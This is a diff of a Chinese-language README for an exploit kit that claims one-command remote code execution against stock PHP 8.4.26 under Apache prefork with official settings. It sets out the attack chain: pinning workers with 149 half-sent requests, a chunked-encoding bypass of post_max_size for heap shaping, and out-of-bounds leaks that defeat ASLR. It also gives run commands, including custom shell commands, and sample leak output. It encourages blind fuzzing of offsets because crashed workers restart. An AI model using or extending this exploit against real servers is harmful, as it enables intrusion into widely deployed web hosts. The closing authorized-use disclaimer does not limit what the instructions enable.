@@ -2,18 +2,18 @@
 
 中文 | [English](readme_en.md)
 
-**单 worker prefork。**环境下在完全远程、只用 HTTP、目标页面只有 `<?php echo "OK\n"; ?>`、不写目标侧
+**官方 prefork 配置（MaxRequestWorkers=150）下**，在完全远程、只用 HTTP、目标页面只有 `<?php echo "OK\n"; ?>`、不写目标侧
 PHP 的约束下，一条命令拿到 RCE：
 
-- stock 官方镜像 + 官方 ini：**5/5**
-- 带符号的同一官方构建（gdb 只用于离线标定，不在交付路径）：**15/15**
-- 单次约 2 秒，worker 不重启，目标 ini 未改
+- stock 官方镜像 + 官方 ini + 官方 worker：**10/10**
+- 单 worker 基线（早期标定/调试）：**20/20**
+- 单次约 3–4 秒（含 149 个占位连接），被固定的 worker 不重启，目标 ini 未改
 
 # 通用利用
 
 理论上只要你计算出所有php版本的偏移，然后利用这些偏移批量去fuzz，总有一条fuzz是能rce的。反正worker崩了也会重启，不怕目标打挂。
 
-关于worker，目前单worker不影响目标实现，只影响胜率，在测试环境先临时使用单worker来装逼，完整官方worker环境之后放出。
+关于 worker：官方 prefork 的 `MaxRequestWorkers=150` 也已打通。脚本先占住 149 个 worker 的未完成请求，再把 A1/B1/A2/B2 固定到剩下的同一个 child；单 worker 只是早期的调试形态（`--workers 1` 仍可复现）。
 
 ## 快速开始（官方 php.ini-production / display_errors=Off / 128M）
 
@@ -27,9 +27,11 @@ cd php2shell-bypass-aslr-exp
 # PHP 8.4.26 ...
 # display_errors => Off => Off
 # memory_limit => 128M => 128M
+# workers: official (run exploit with --workers 150)
 
 # 2) 一条命令：A1 -> B1 泄漏 -> A2 -> B2 -> id
 python3 exploit.py --port 18110
+#       pinned 150/150 workers (149 holders)
 # [try 1] A1: END-cleanup send_cookie OOM
 # [try 1] B1: stale-id OOB read (chunk base + libphp)
 #       decoded=819208 zval_ptr_dtor=0x7fe00ef5db60 -> libphp=0x7fe00e8ff000
@@ -41,8 +43,9 @@ python3 exploit.py --port 18110
 ```
 
 不编译 PHP/Apache、不 build 镜像、不挂 gdb、不改目标 ini。
-`pure/run_pure.sh` 默认容器 `p2s-pure-18110`、端口 `18110`，起完会打印
-实际的 `display_errors` / `memory_limit` / `post_max_size` 等值。
+`pure/run_pure.sh` 默认容器 `p2s-pure-18110`、端口 `18110`，默认使用
+官方 prefork 配置（MaxRequestWorkers=150），起完会打印实际 ini 和 MPM
+值；`--single` 才挂单 worker 的 `docker/apache.conf`（配合 `--workers 1`）。
 Linux 上没有 docker 组权限时脚本会自动改用 `sudo docker`，也可以显式
 `DOCKER="sudo docker" ./pure/run_pure.sh`；`--dbg` 仅用于换成带符号的
 同一构建做离线标定。
@@ -52,6 +55,9 @@ Linux 上没有 docker 组权限时脚本会自动改用 `sudo docker`，也可�
 ```bash
 # 换新 ASLR 复测（重启容器）
 python3 exploit.py --port 18110 --restart p2s-pure-18110
+
+# 官方 worker 是默认值；--single 起的单 worker 目标用 --workers 1
+python3 exploit.py --port 18110 --workers 1
 
 # 自定义命令：把脚本写进挂载目录，再用 sh 执行
 printf 'id; uname -a > /out/p1\n' > out/c
@@ -67,6 +73,9 @@ python3 exploit.py --port 18110 --cmd 'sh</out/c'
 目标页面只有 `<?php echo "OK\n"; ?>`，攻击流量只有 chunked multipart
 和普通 GET/POST：
 
+0. **worker pinning**：官方 `MaxRequestWorkers=150`；先开 149 个只发了
+   一半 body 的 POST 占住其它 child，A1/B1/A2/B2 就都会落到剩下的同一个
+   child，跨请求的悬空指针才有效。
 1. **chunked 绕过 `post_max_size`**：不带 `Content-Length` 时
    `content_length=0`，`rfc1867_post_handler` 开头的检查被跳过，
    可以发送远大于 8M 的 body 做堆整形。
@@ -105,6 +114,7 @@ ASLR 每次容器启动会变，链上两次泄漏会自己算出来。
 - 全链脚本：[exploit.py](exploit.py)（`pure/pwn_pure.py` 保留为别名）
 - 调试镜像批量日志：[pure/evidence/pwn_pure_batch_20261022.log](pure/evidence/pwn_pure_batch_20261022.log)
 - 官方镜像日志：[pure/evidence/pwn_pure_official_20261022.log](pure/evidence/pwn_pure_official_20261022.log)
+- 官方 worker 日志：[pure/evidence/official_workers_20261022.log](pure/evidence/official_workers_20261022.log)
 - proof：[pure/evidence/pwn_pure_proof_p1.txt](pure/evidence/pwn_pure_proof_p1.txt)
 
 ## 旧线（legacy，非本目标）
@@ -119,6 +129,7 @@ ASLR 每次容器启动会变，链上两次泄漏会自己算出来。
 ## 复现声明
 
 - 目标配置就是官方 `php.ini-production`（`display_errors=Off`、
-  `memory_limit=128M`）：没有自定义 ini、没有 `display_errors=On`
-  依赖、没有目标侧文件、没有 `session_start()`、交付路径不用 gdb。
+  `memory_limit=128M`）和官方 prefork worker（MaxRequestWorkers=150）：
+  没有自定义 ini、没有 `display_errors=On` 依赖、没有目标侧文件、
+  没有 `session_start()`、交付路径不用 gdb。
 - 仅用于授权环境中的漏洞研究与复现。
